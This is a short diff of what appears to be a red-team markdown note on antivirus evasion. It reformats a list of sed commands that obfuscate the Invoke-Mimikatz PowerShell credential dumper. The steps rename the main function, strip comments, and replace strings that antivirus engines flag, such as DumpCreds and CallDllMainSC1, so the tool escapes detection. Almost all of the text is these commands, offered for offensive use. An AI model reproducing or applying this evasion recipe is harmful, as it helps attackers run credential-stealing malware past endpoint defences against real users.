@@ -11,13 +11,13 @@ Antivirus evasion activity using set command and ISE sploit module to bypass win
   ```diff sed -i -e 's/Invoke-Mimikatz/Invoke-LSASSscraper/g' Invoke-Mimikatz.ps1```
 
 - Step 3: remove all comments:
-  sed -i -e '/<#/,/#>/c\\' Invoke-Mimikatz.ps1
+   ```sed -i -e '/<#/,/#>/c\\' Invoke-Mimikatz.ps1```
 
 - Step 4: remove all comment indented
-  sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1
+   ```sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1```
 
 - Step 5: replace parameters and strings they can picked up by antivirus engine:
-  sed -i -e 's/DumpCreds/Dump/g' Invoke-Mimikatz.ps1
+  ```sed -i -e 's/DumpCreds/Dump/g' Invoke-Mimikatz.ps1
   sed -i -e 's/ArgumentPtr/0bf/g' Invoke-Mimikatz.ps1
   sed -i -e 's/CallDllMainSC1/0bfSC1/g' Invoke-Mimikatz.ps1
-  sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" Invoke-Mimikatz.ps1
+  sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" Invoke-Mimikatz.ps1```
